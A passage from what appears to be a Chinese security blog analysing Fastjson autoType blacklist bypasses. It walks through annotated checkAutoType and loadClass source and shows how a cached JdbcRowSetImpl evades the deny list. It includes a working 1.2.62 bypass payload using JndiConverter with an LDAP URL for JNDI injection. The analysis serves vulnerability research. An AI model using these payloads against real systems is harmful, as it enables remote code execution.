</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">T</span> <span class="nf">deserialze</span><span class="o">(</span><span class="n">DefaultJSONParser</span> <span class="n">parser</span><span class="o">,</span> <span class="n">Type</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">Object</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">(</span><span class="n">T</span><span class="o">)</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">strVal</span><span class="o">,</span> <span class="n">parser</span><span class="o">.</span><span class="na">getConfig</span><span class="o">().</span><span class="na">getDefaultClassLoader</span><span class="o">());</span><span class="c1">//此时的strVal为com.sun.rowset.JdbcRowSetImpl
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/a3b33a226a125c77e856ea1f9e00f8dd.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/a3b33a226a125c77e856ea1f9e00f8dd.png, https://img.mi3aka.eu.org/2023/02/a3b33a226a125c77e856ea1f9e00f8dd.png 1.5x, https://img.mi3aka.eu.org/2023/02/a3b33a226a125c77e856ea1f9e00f8dd.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/a3b33a226a125c77e856ea1f9e00f8dd.png"
        title="https://img.mi3aka.eu.org/2023/02/a3b33a226a125c77e856ea1f9e00f8dd.png" /></p>
<ol start="5">
<li>进行<code>loadClass</code></li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="k">try</span><span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ClassLoader</span> <span class="n">contextClassLoader</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="o">(</span><span class="n">contextClassLoader</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">contextClassLoader</span> <span class="o">!=</span> <span class="n">classLoader</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">contextClassLoader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">className</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">cache</span><span class="o">)</span> <span class="o">{</span><span class="c1">//默认开启cache,mappings(内置类)中添加了原本处于黑名单中的com.sun.rowset.JdbcRowSetImpl
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">mappings</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">className</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/237528f7b630281a44c2c87a607de675.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/237528f7b630281a44c2c87a607de675.png, https://img.mi3aka.eu.org/2023/02/237528f7b630281a44c2c87a607de675.png 1.5x, https://img.mi3aka.eu.org/2023/02/237528f7b630281a44c2c87a607de675.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/237528f7b630281a44c2c87a607de675.png"
        title="https://img.mi3aka.eu.org/2023/02/237528f7b630281a44c2c87a607de675.png" /></p>
<ol start="6">
<li>第二次checkAutoType</li>
</ol>
<p>此时的<code>typename</code>为<code>com.sun.rowset.JdbcRowSetImpl</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">checkAutoType</span><span class="o">(</span><span class="n">String</span> <span class="n">typeName</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">expectClass</span><span class="o">,</span> <span class="kt">int</span> <span class="n">features</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">getClassFromMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">);</span><span class="c1">//从mappings(内置类)中加载com.sun.rowset.JdbcRowSetImpl
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="o">...</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span><span class="c1">//后续流程与1.2.24一致
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/1e26fee317ee9f3beac9914c376606e8.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/1e26fee317ee9f3beac9914c376606e8.png, https://img.mi3aka.eu.org/2023/02/1e26fee317ee9f3beac9914c376606e8.png 1.5x, https://img.mi3aka.eu.org/2023/02/1e26fee317ee9f3beac9914c376606e8.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/1e26fee317ee9f3beac9914c376606e8.png"
        title="https://img.mi3aka.eu.org/2023/02/1e26fee317ee9f3beac9914c376606e8.png" /></p>
<h3 id="开启autotypesupport">开启AutoTypeSupport</h3>
<blockquote>
<p>主要不同点在于第二次checkAutoType</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">checkAutoType</span><span class="o">(</span><span class="n">String</span> <span class="n">typeName</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">expectClass</span><span class="o">,</span> <span class="kt">int</span> <span class="n">features</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">h3</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">^=</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">*=</span> <span class="n">PRIME</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">acceptHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">denyHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">getClassFromMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">                     * 此时com.sun.rowset.JdbcRowSetImpl匹配到黑名单中的哈希,由于当前条件运算符为&amp;&amp;,需要getClassFromMapping的结果为空才能抛出异常
</span></span></span><span class="line"><span class="cl"><span class="cm">                     * 但前面的流程中将com.sun.rowset.JdbcRowSetImpl添加到mappings(内置类)中,因此条件不满足
</span></span></span><span class="line"><span class="cl"><span class="cm">                     */</span>
</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">getClassFromMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">);</span><span class="c1">//从mappings(内置类)中加载com.sun.rowset.JdbcRowSetImpl
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="o">...</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span><span class="c1">//后续流程与1.2.24一致
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/5304b431bb40a2537cd98571e97af41e.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/5304b431bb40a2537cd98571e97af41e.png, https://img.mi3aka.eu.org/2023/02/5304b431bb40a2537cd98571e97af41e.png 1.5x, https://img.mi3aka.eu.org/2023/02/5304b431bb40a2537cd98571e97af41e.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/5304b431bb40a2537cd98571e97af41e.png"
        title="https://img.mi3aka.eu.org/2023/02/5304b431bb40a2537cd98571e97af41e.png" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/4c2057b4a23397b8ea00287678df806d.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/4c2057b4a23397b8ea00287678df806d.png, https://img.mi3aka.eu.org/2023/02/4c2057b4a23397b8ea00287678df806d.png 1.5x, https://img.mi3aka.eu.org/2023/02/4c2057b4a23397b8ea00287678df806d.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/4c2057b4a23397b8ea00287678df806d.png"
        title="https://img.mi3aka.eu.org/2023/02/4c2057b4a23397b8ea00287678df806d.png" /></p>
<h2 id="1262">1.2.62</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">与1.2.45的绕过类似,通过xbean-reflect进行绕过
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">bypass_1_2_62</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">json_str</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;org.apache.xbean.propertyeditor.JndiConverter\&#34;,\&#34;AsText\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;}&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json_str</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/a8fbe5ddd220e8fdfae0181be5df35cb.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/a8fbe5ddd220e8fdfae0181be5df35cb.png, https://img.mi3aka.eu.org/2023/02/a8fbe5ddd220e8fdfae0181be5df35cb.png 1.5x, https://img.mi3aka.eu.org/2023/02/a8fbe5ddd220e8fdfae0181be5df35cb.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/a8fbe5ddd220e8fdfae0181be5df35cb.png"
        title="https://img.mi3aka.eu.org/2023/02/a8fbe5ddd220e8fdfae0181be5df35cb.png" /></p>
<h3 id="checkautotype分析-4">checkAutoType分析</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span><span class="lnt">96
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">checkAutoType</span><span class="o">(</span><span class="n">String</span> <span class="n">typeName</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">expectClass</span><span class="o">,</span> <span class="kt">int</span> <span class="n">features</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">boolean</span> <span class="n">expectClassFlag</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span><span class="c1">//当且仅当expectClass参数不为空且不为Object,Serializable...等类型时expectClassFlag才为true
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">==</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">==</span> <span class="n">Serializable</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">==</span> <span class="n">Cloneable</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">==</span> <span class="n">Closeable</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">==</span> <span class="n">EventListener</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">==</span> <span class="n">Iterable</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">==</span> <span class="n">Collection</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">typeName</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;$&#39;</span><span class="o">,</span> <span class="sc">&#39;.&#39;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">BASIC</span> <span class="o">=</span> <span class="mh">0xcbf29ce484222325L</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">PRIME</span> <span class="o">=</span> <span class="mh">0x100000001b3L</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">h1</span> <span class="o">=</span> <span class="o">(</span><span class="n">BASIC</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">h1</span> <span class="o">==</span> <span class="mh">0xaf64164c86024f1aL</span><span class="o">)</span> <span class="o">{</span> <span class="c1">// [
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">((</span><span class="n">h1</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="mi">1</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span> <span class="o">==</span> <span class="mh">0x9198507b5af98f0L</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">h3</span> <span class="o">=</span> <span class="o">(((((</span><span class="n">BASIC</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">1</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">2</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">internalWhite</span> <span class="o">=</span> <span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">INTERNAL_WHITELIST_HASHCODES</span><span class="o">,</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">fnv1a_64</span><span class="o">(</span><span class="n">className</span><span class="o">))</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">;</span><span class="c1">//内部白名单检查
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">((!</span><span class="n">internalWhite</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">expectClassFlag</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//不在内部白名单中且开启autotype或expectClassFlag为true,进行检查
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">//org.apache.xbean.propertyeditor.JndiConverter不在黑名单中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">long</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">h3</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">^=</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">*=</span> <span class="n">PRIME</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">acceptHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
